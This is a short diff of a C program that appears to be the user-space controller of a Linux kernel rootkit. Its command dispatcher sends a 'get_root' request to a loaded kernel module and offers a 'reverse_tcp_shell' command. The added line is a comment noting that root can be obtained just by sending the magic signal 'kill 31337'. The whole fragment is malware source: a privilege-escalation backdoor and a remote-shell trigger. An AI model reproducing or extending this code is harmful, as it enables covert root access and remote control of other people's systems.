@@ -127,6 +127,7 @@ int main(int argc, char* argv[]) {
 	char* base_cmd = argv[1];
 	if (!strcmp(base_cmd, cmd.root)) {
 		action.func_code = f_code.get_root;
+		// TODO: Just call $ kill 31337
 		return communicate_with_lkm(action);
 	} else if (!strcmp(base_cmd, cmd.reverse_tcp_shell)) {
 		action.func_code = f_code.reverse_tcp_shell;
